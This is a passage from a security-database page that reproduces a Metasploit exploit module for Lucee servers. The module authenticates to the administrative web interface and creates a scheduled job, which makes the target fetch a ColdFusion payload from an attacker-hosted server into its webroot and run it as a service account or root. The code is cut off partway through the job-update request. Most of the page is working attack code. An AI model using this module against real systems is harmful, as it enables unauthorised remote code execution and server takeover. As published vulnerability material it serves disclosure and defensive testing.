---
title: Lucee Authenticated Scheduled Job Code Execution
url: https://cxsecurity.com/issue/WLB-2023030010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-06
fetch_date: 2025-10-04T08:45:04.382919
---

# Lucee Authenticated Scheduled Job Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Lucee Authenticated Scheduled Job Code Execution** **2023.03.05**  Credit:  **[Alexander Philiotis](https://cxsecurity.com/author/Alexander%2BPhiliotis/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer::HTML
include Msf::Exploit::Retry
include Msf::Exploit::FileDropper
require 'base64'
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Lucee Authenticated Scheduled Job Code Execution',
'Description' => %q{
This module can be used to execute a payload on Lucee servers that have an exposed
administrative web interface. It's possible for an administrator to create a
scheduled job that queries a remote ColdFusion file, which is then downloaded and executed
when accessed. The payload is uploaded as a cfm file when queried by the target server. When executed,
the payload will run as the user specified during the Lucee installation. On Windows, this is a service account;
on Linux, it is either the root user or lucee.
},
'Targets' => [
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :windows\_cmd
}
],
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
]
],
'Author' => 'Alexander Philiotis', # aphiliotis@synercomm.com
'License' => MSF\_LICENSE,
'References' => [
# This abuses the functionality inherent to the Lucee platform and
# thus is not related to any CVEs.
# Lucee Docs
['URL', 'https://docs.lucee.org/'],
# cfexecute & cfscript documentation
['URL', 'https://docs.lucee.org/reference/tags/execute.html'],
['URL', 'https://docs.lucee.org/reference/tags/script.html'],
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [
# /opt/lucee/server/lucee-server/context/logs/application.log
# /opt/lucee/web/logs/exception.log
IOC\_IN\_LOGS,
ARTIFACTS\_ON\_DISK,
# ColdFusion files located at the webroot of the Lucee server
# C:/lucee/tomcat/webapps/ROOT/ by default on Windows
# /opt/lucee/tomcat/webapps/ROOT/ by default on Linux
]
},
'Stance' => Msf::Exploit::Stance::Aggressive,
'DisclosureDate' => '2023-02-10'
)
)
register\_options(
[
Opt::RPORT(8888),
OptString.new('PASSWORD', [false, 'The password for the administrative interface']),
OptString.new('TARGETURI', [true, 'The path to the admin interface.', '/lucee/admin/web.cfm']),
OptInt.new('PAYLOAD\_DEPLOY\_TIMEOUT', [false, 'Time in seconds to wait for access to the payload', 20]),
]
)
deregister\_options('URIPATH')
end
def exploit
payload\_base = rand\_text\_alphanumeric(8..16)
authenticate
start\_service({
'Uri' => {
'Proc' => proc do |cli, req|
print\_status("Payload request received for #{req.uri} from #{cli.peerhost}")
send\_response(cli, cfm\_stub)
end,
'Path' => '/' + payload\_base + '.cfm'
}
})
#
# Create the scheduled job
#
create\_job(payload\_base)
#
# Execute the scheduled job and attempt to send a GET request to it.
#
execute\_job(payload\_base)
print\_good('Exploit completed.')
#
# Removes the scheduled job
#
print\_status('Removing scheduled job ' + payload\_base)
cleanup\_request = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path),
'vars\_get' => {
'action' => 'services.schedule'
},
'vars\_post' => {
'row\_1' => '1',
'name\_1' => payload\_base.to\_s,
'mainAction' => 'delete'
}
})
if cleanup\_request && cleanup\_request.code == 302
print\_good('Scheduled job removed.')
else
print\_bad('Failed to remove scheduled job.')
end
end
def authenticate
auth = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path),
'keep\_cookies' => true,
'vars\_post' => {
'login\_passwordweb' => datastore['PASSWORD'],
'lang' => 'en',
'rememberMe' => 's',
'submit' => 'submit'
}
})
unless auth
fail\_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
end
unless auth.code == 200 && auth.body.include?('nav\_Security')
fail\_with(Failure::NoAccess, 'Unable to authenticate. Please double check your credentials and try again.')
end
print\_good('Authenticated successfully')
end
def create\_job(payload\_base)
create\_job = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path),
'keep\_cookies' => true,
'vars\_get' => {
'action' => 'services.schedule',
'action2' => 'create'
},
'vars\_post' => {
'name' => payload\_base,
'url' => get\_uri.to\_s,
'interval' => '3600',
'start\_day' => '01',
'start\_month' => '02',
'start\_year' => '2023',
'start\_hour' => '00',
'start\_minute' => '00',
'start\_second' => '00',
'run' => 'create'
}
})
fail\_with(Failure::Unreachable, 'Could not connect to the web service') if create\_job.nil?
fail\_with(Failure::UnexpectedReply, 'Unable to create job') unless create\_job.code == 302
print\_good('Job ' + payload\_base + ' created successfully')
job\_file\_path = file\_path = webroot
fail\_with(Failure::UnexpectedReply, 'Could not identify the web root') if job\_file\_path.blank?
case target['Type']
when :unix\_cmd
file\_path << '/'
job\_file\_path = "#{job\_file\_path.gsub('/', '//')}//"
when :windows\_cmd
file\_path << '\\'
job\_file\_path = "#{job\_file\_path.gsub('\\', '\\\\')}\\"
end
update\_job = send\_request\_cgi({
'method' => 'POST',
'uri' => target\_uri.path,
'keep\_cookies' => true,
'vars\_get' => {
'action' => 'services.schedule',
'action2' => 'edit',
'task' => create\_job.headers['location'].split('=')[-1]
},
'vars\_post' => {
'name' => payload\_base,
'url' => get\_uri.to\_s,
'port' => datastore['SRVPORT'],
'timeout' => '50',
'username' => '',
'password' => '',
'proxyserver' => '',
'proxyport' => '',
'proxyuser' => '',
'proxypassword' => '',
'publish' => 'true',
'file' => "#{job\_file\_path}#{payload\_base}.cfm",
'start\_day' => '01',
'start\_month' => '02',
'start\_year' => '2023',
'start\_hour' => '00',
'start\_minute' => '00',
'start\_second' => '00',
'end\_day' => '',
'end\_month' => '',
'end\_year' => '',
'end\_hour' => '',
'end\_minute' => '',
'end\_second' => '',
'interval\...